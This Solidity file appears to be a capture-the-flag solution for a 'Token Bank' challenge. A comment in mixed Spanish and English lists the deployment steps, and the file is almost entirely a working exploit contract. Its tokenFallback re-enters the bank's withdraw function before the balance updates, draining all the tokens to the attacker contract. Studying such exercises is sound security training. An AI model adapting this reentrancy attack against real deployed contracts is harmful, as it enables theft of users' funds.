pragma solidity ^0.4.21;
/* Its a reentrancy (transfer is called before balance update)
1 Deploy BankChallenge
2 Call BankChallenge.token() to get subyacent token contract address
3 Attach to that address as SimpleERC223Token
4 Call BankChallenge.withdraw para sacar plata de banco al token
5 Call SimpleERC223.approve(myownAddress,500000000000000000000000) para poder transferir
6 Call SimpleERC223.transfer(exploit address,500000000000000000000000) para transferir al contrato atacante
7 Call exploit.attack()
8 Call BankChallenge.isComplete()
*/
interface ITokenBankChallenge {
    function token() external returns (address);
    function balanceOf(address from) external returns (uint256);
    function withdraw(uint256 amount) external;
    function isComplete() external view returns (bool);
}

interface ISimpleERC223Token {
    function totalSupply() external returns (uint256);
    function balanceOf(address from) external returns (uint256);
    function transfer(address to, uint256 value) external returns (bool success);
}

contract ExploitTokenBankChallenge {
    ITokenBankChallenge public bank = ITokenBankChallenge(0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95);

    function attack() public {
        ISimpleERC223Token token = ISimpleERC223Token(bank.token());

        uint256 balance = token.balanceOf(this);
        require(balance == token.balanceOf(address(bank)));
        require(balance + token.balanceOf(address(bank)) == token.totalSupply());

        token.transfer(address(bank), balance);
        require(token.balanceOf(this) == 0);
        require(balance == bank.balanceOf(this));
        require(token.balanceOf(address(bank)) == token.totalSupply());

        bank.withdraw(balance);
        require(bank.isComplete() == true);
    }

    function tokenFallback(address from, uint256, bytes) public {
        ISimpleERC223Token token = ISimpleERC223Token(bank.token());
        require(msg.sender == address(token));

        if (from == address(bank)) {
            if (token.balanceOf(address(bank)) > 0) {
                uint256 balance = bank.balanceOf(this);
                bank.withdraw(balance);
            }
        }
    }
}
